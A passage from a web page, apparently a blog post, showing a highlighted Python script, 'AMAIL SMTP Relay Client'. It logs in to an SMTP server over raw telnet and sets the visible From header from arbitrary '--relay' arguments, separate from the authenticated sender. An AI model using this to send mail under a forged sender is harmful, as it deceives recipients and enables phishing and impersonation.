+</span></span><span style="display:flex;"><span>logging<span style="color:#f92672">.</span>basicConfig(format<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%(pathname)s</span><span style="color:#e6db74">[line:</span><span style="color:#e6db74">%(lineno)d</span><span style="color:#e6db74">] - </span><span style="color:#e6db74">%(levelname)s</span><span style="color:#e6db74">: </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#39;</span>,level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SMTPClient</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self,):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_to <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_mail_header</span>(self,mail_subject,mail_relay,mail_relay_name):
+</span></span><span style="display:flex;"><span>        now_date <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%a</span><span style="color:#e6db74">, </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %b %Y %H:%M:%S +0800 (CST)&#34;</span>, time<span style="color:#f92672">.</span>localtime())
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Date: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">From: =?UTF-8?B?</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">?= &lt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">To: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Subject: =?UTF-8?B?</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">?=</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(now_date,
+</span></span><span style="display:flex;"><span>            base64<span style="color:#f92672">.</span>b64encode(mail_relay_name<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(),
+</span></span><span style="display:flex;"><span>            mail_relay,
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>mail_to[<span style="color:#ae81ff">0</span>],base64<span style="color:#f92672">.</span>b64encode(mail_subject<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_mail</span>(self,mail_from,mail_to,send_body):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_from <span style="color:#f92672">=</span> mail_from
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>mail_to <span style="color:#f92672">=</span> mail_to
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(send_body, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f_body:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_data <span style="color:#f92672">=</span> f_body<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>        f_body<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_ehlo</span>(self, content):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(content<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_mail</span>(self):
+</span></span><span style="display:flex;"><span>        mail_from <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;MAIL FROM:&lt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&gt;&#34;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>mail_from
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>info(mail_from)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250 Mail Ok</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(mail_from<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Mail Ok</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;250 Mail Ok&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> mail <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>mail_to:
+</span></span><span style="display:flex;"><span>            mail_rpct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RCPT TO:&lt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&gt;&#34;</span> <span style="color:#f92672">%</span> mail
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(mail_rpct<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Rcpt Ok</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>            logging<span style="color:#f92672">.</span>info(mail_rpct)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250 Rcpt Ok</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;DATA</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span>
+</span></span><span style="display:flex;"><span>        send_all <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>mail_header<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span>self<span style="color:#f92672">.</span>send_data<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># self.tn.write(self.mail_header.encode()+b&#34;\r\n&#34;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># self.tn.write(self.send_data+b&#34;\r\n.\r\n&#34;)</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(send_all)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250 Data Ok: queued as freedom</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 Data Ok: queued as freedom</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;250 Data Ok&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_host</span>(self,host_ip,username,password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>open(host_ip,port<span style="color:#f92672">=</span><span style="color:#ae81ff">25</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> Connect Error..&#39;</span><span style="color:#f92672">%</span>host_ip)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_ehlo(<span style="color:#e6db74">&#34;EHLO virtual-machine</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-smtp.aliyun-inc.com</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-STARTTLS</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-8BITMIME</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-AUTH=PLAIN LOGIN XALIOAUTH</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-AUTH PLAIN LOGIN XALIOAUTH</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250-PIPELINING</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># 250 DSN</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-smtp.aliyun-inc.com</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-STARTTLS</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-8BITMIME</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-AUTH=PLAIN LOGIN XALIOAUTH</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-AUTH PLAIN LOGIN XALIOAUTH</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250-PIPELINING</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;250 DSN</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AUTH LOGIN</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;334 dXNlcm5hbWU6</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(base64<span style="color:#f92672">.</span>b64encode(username<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;334 UGFzc3dvcmQ6</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(base64<span style="color:#f92672">.</span>b64encode(password<span style="color:#f92672">.</span>encode()) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;235 Authentication successful</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;235 Authentication successful&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout_host</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;QUIT</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;221 Bye</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>tn<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>        logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;QUIT&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>description <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AMAIL SMTP Relay Client - Version 1.0&#34;</span>
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-f&#34;</span>,<span style="color:#e6db74">&#34;--mail_from&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail From&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-t&#34;</span>,<span style="color:#e6db74">&#34;--mail_to&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail To&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>,<span style="color:#e6db74">&#34;--username&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Username&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-p&#34;</span>,<span style="color:#e6db74">&#34;--password&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Password&#34;</span>,required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-s&#34;</span>,<span style="color:#e6db74">&#34;--server&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SMTP Server&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;smtp.mxhichina.com&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-b&#34;</span>,<span style="color:#e6db74">&#34;--body&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Body&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-r&#34;</span>,<span style="color:#e6db74">&#34;--relay&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Relay To&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--relay_name&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Relay To Name&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--subject&#34;</span>,type<span style="color:#f92672">=</span>str,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mail Subject&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    smtp_client <span style="color:#f92672">=</span> SMTPClient()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> smtp_client<span style="color:#f92672">.</span>login_host(args<span style="color:#f92672">.</span>server,args<span style="color:#f92672">.</span>username,args<span style="color:#f92672">.</span>password):
+</span></span><span style="display:flex;"><span>        smtp_client<span style="color:#f92672">.</span>set_mail(args<span style="color:#f92672">.</span>mail_from,args<span style="color:#f92672">.</span>mail_to<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>),args<span style="color:#f92672">.</span>body)
+</span></span><span style="display:flex;"><span>        smtp_client<span style="color:#f92672">.</span>set_mail_header(args<span style="color:#f92672">.</span>subject,args<span style="color:#f92672">.</span>relay,args<span style="color:#f92672">.</span>relay_name)
+</span></span><span style="display:flex;"><span>        smtp_client<span style="color:#f92672">.</span>send_mail()
+</span></span><span style="display:flex;"><span>        smtp_client<span style="color:#f92672">.</span>logout_host()
+</span></span></code></pre></div>
 </div>
 <div class="container">
     <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
